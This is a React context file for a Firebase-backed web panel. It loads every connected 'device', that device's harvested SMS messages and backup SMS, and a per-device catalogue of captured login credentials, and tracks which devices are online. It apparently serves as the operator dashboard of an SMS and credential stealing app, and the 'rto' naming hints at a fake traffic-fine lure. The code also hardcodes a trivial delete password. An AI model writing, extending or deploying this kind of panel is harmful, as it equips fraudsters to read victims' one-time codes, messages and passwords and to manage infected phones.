// app/context/AppContext.js
'use client';

import React, { createContext, useContext, useState, useEffect, useCallback } from 'react';
import { database } from '../utils/firebase';
import { ref, onValue } from 'firebase/database';

const AppContext = createContext();

const DELETE_PASSWORD = '9999';
const DEVICE_LIMIT = 5;
const SMS_LIMIT = 10;
const CREDS_PER_PAGE = 10;
const COMMAND_CLEAR_DELAY = 8000;

export function AppProvider({ children }) {
    const [data, setData] = useState({
        user_data: {},
        user_sms: {},
        login: {},
        backup_sms: {}
    });
    const [deviceOnlineStatus, setDeviceOnlineStatus] = useState(new Map());
    const [deviceSerialMap, setDeviceSerialMap] = useState(new Map());
    const [deviceSmsCache, setDeviceSmsCache] = useState(new Map());
    const [allDeviceKeys, setAllDeviceKeys] = useState([]);
    const [filteredKeys, setFilteredKeys] = useState([]);
    const [allSmsList, setAllSmsList] = useState([]);
    const [modalSmsList, setModalSmsList] = useState([]);
    const [expandedDevices, setExpandedDevices] = useState(new Map());
    const [activeTabs, setActiveTabs] = useState(new Map());
    const [isPanelOpen, setIsPanelOpen] = useState({
        devices: true,
        favourites: false,
        sms: false,
        credentials: false,
        backup: false,
        analytics: false
    });
    const [formMemory, setFormMemory] = useState({});
    const [deviceOffset, setDeviceOffset] = useState(0);
    const [allSmsOffset, setAllSmsOffset] = useState(0);
    const [modalSmsOffset, setModalSmsOffset] = useState(0);
    const [currentFilter, setCurrentFilter] = useState('all');
    const [searchQuery, setSearchQuery] = useState('');
    const [smsFilterDevice, setSmsFilterDevice] = useState(null);
    const [modalTarget, setModalTarget] = useState('ALL');
    const [isRendering, setIsRendering] = useState(false);
    const [favourites, setFavourites] = useState([]);
    const [credFilter, setCredFilter] = useState('all');
    const [credSearchQuery, setCredSearchQuery] = useState('');
    const [credCurrentPage, setCredCurrentPage] = useState(1);
    const [credCatalogData, setCredCatalogData] = useState([]);
    const [isFirstLoad, setIsFirstLoad] = useState(true);
    const [isConnected, setIsConnected] = useState(false);

    // Load favourites from localStorage
    useEffect(() => {
        try {
            const saved = localStorage.getItem('rtoFavourites');
            if (saved) {
                setFavourites(JSON.parse(saved));
            }
        } catch (e) {
            setFavourites([]);
        }
    }, []);

    // Save favourites to localStorage
    useEffect(() => {
        try {
            localStorage.setItem('rtoFavourites', JSON.stringify(favourites));
        } catch (e) {
            console.error('Failed to save favourites:', e);
        }
    }, [favourites]);

    // Firebase data listener
    useEffect(() => {
        const dataRef = ref(database);
        
        const unsubscribe = onValue(dataRef, (snapshot) => {
            const newData = snapshot.val() || {};
            setData(newData);
            updateCaches(newData);
        });

        // Connection status
        const connectedRef = ref(database, '.info/connected');
        const connectedUnsubscribe = onValue(connectedRef, (snap) => {
            setIsConnected(snap.val() === true);
        });

        return () => {
            unsubscribe();
            connectedUnsubscribe();
        };
    }, []);

    const updateCaches = useCallback((newData) => {
        const devices = newData.user_data || {};
        const smsData = newData.user_sms || {};
        const now = Date.now();

        // Update device keys
        const keys = Object.keys(devices);
        setAllDeviceKeys(keys);

        // Update online status
        const newStatus = new Map();
        keys.forEach(devId => {
            const dev = devices[devId];
            if (dev) {
                const isOnline = dev.isOnline || dev.online || false;
                const lastSeen = dev.last_online || dev.timestamp || 0;
                const isRecent = (now - lastSeen) < 120000;
                newStatus.set(devId, isOnline || isRecent);
            }
        });
        setDeviceOnlineStatus(newStatus);

        // Update SMS cache
        const newCache = new Map();
        keys.forEach(devId => {
            if (smsData[devId]) {
                const msgKeys = Object.keys(smsData[devId]);
                const newAll = msgKeys.map(k => smsData[devId][k]);
                const cached = deviceSmsCache.get(devId);
                if (!cached || JSON.stringify(cached.all) !== JSON.stringify(newAll)) {
                    newCache.set(devId, {
                        all: newAll,
                        offset: 0,
                        version: (cached?.version || 0) + 1
                    });
                } else {
                    newCache.set(devId, cached);
                }
            }
        });
        setDeviceSmsCache(newCache);

        // Update serial map
        const newSerialMap = new Map();
        keys.forEach(devId => {
            const dev = devices[devId];
            if (dev) {
                let serial = dev.user_serial || dev.uesr_serial || 0;
                if (typeof serial === 'string') serial = parseInt(serial) || 0;
                newSerialMap.set(devId, serial);
            }
        });
        setDeviceSerialMap(newSerialMap);

        // Update all SMS list
        const newSmsList = [];
        Object.keys(smsData).forEach(devId => {
            const msgs = smsData[devId];
            if (msgs) {
                Object.keys(msgs).forEach(k => {
                    const msg = msgs[k];
                    if (msg && typeof msg === 'object') {
                        newSmsList.push({
                            deviceId: devId,
                            ...msg,
                            sender: msg.sender || msg.address || 'Unknown',
                            body: msg.body || msg.message || 'No content',
                            timestamp: msg.timestamp || msg.date || 0
                        });
                    }
                });
            }
        });
        newSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
        setAllSmsList(newSmsList);

        // Update credential catalog
        const loginData = newData.login || {};
        const newCredData = [];
        let totalCreds = 0;
        
        Object.keys(loginData).forEach(devId => {
            const creds = loginData[devId];
            if (creds && Object.keys(creds).length > 0) {
                const credList = [];
                Object.keys(creds).forEach(key => {
                    const credData = { key, ...creds[key] };
                    credData._timestamp = credData.timestamp || credData.date || Date.now();
                    credList.push(credData);
                });
                credList.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
                
                newCredData.push({
                    deviceId: devId,
                    serial: newSerialMap.get(devId) || 0,
                    deviceInfo: devices[devId] || {},
                    credentials: credList,
                    count: credList.length,
                    latestTimestamp: credList.length > 0 ? credList[0]._timestamp : 0
                });
                totalCreds += credList.length;
            }
        });
        newCredData.sort((a, b) => (b.latestTimestamp || 0) - (a.latestTimestamp || 0));
        setCredCatalogData(newCredData);

        if (isFirstLoad) {
            setIsFirstLoad(false);
        }
    }, [deviceSmsCache, isFirstLoad]);

    // Helper functions
    const isFavourite = useCallback((devId) => {
        return favourites.includes(devId);
    }, [favourites]);

    const toggleFavourite = useCallback((devId) => {
        setFavourites(prev => {
            if (prev.includes(devId)) {
                return prev.filter(id => id !== devId);
            } else {
                return [...prev, devId];
            }
        });
    }, []);

    const togglePanel = useCallback((panel) => {
        setIsPanelOpen(prev => {
            const newState = {};
            Object.keys(prev).forEach(key => {
                if (key === panel) {
                    newState[key] = !prev[key];
                } else {
                    newState[key] = false;
                }
            });
            return newState;
        });
    }, []);

    const toggleDevice = useCallback((devId) => {
        setExpandedDevices(prev => {
            const newMap = new Map(prev);
            newMap.set(devId, !prev.get(devId));
            return newMap;
        });
    }, []);

    const setTab = useCallback((devId, tab) => {
        setActiveTabs(prev => {
            const newMap = new Map(prev);
            if (prev.get(devId) === tab) {
                newMap.delete(devId);
            } else {
                newMap.set(devId, tab);
            }
            return newMap;
        });
    }, []);

    const value = {
        data,
        deviceOnlineStatus,
        deviceSerialMap,
        deviceSmsCache,
        allDeviceKeys,
        filteredKeys,
        allSmsList,
        modalSmsList,
        expandedDevices,
        activeTabs,
        isPanelOpen,
        formMemory,
        deviceOffset,
        allSmsOffset,
        modalSmsOffset,
        currentFilter,
        searchQuery,
        smsFilterDevice,
        modalTarget,
        isRendering,
        favourites,
        credFilter,
        credSearchQuery,
        credCurrentPage,
        credCatalogData,
        isConnected,
        isFirstLoad,
        setDeviceOffset,
        setAllSmsOffset,
        setModalSmsOffset,
        setCurrentFilter,
        setSearchQuery,
        setSmsFilterDevice,
        setModalTarget,
        setFormMemory,
        setCredFilter,
        setCredSearchQuery,
        setCredCurrentPage,
        setFilteredKeys,
        setModalSmsList,
        setDeviceSmsCache,
        isFavourite,
        toggleFavourite,
        togglePanel,
        toggleDevice,
        setTab,
        DELETE_PASSWORD,
        DEVICE_LIMIT,
        SMS_LIMIT,
        CREDS_PER_PAGE,
        COMMAND_CLEAR_DELAY,
        updateCaches
    };

    return (
        <AppContext.Provider value={value}>
            {children}
        </AppContext.Provider>
    );
}

export function useAppContext() {
    const context = useContext(AppContext);
    if (!context) {
        throw new Error('useAppContext must be used within an AppProvider');
    }
    return context;
}
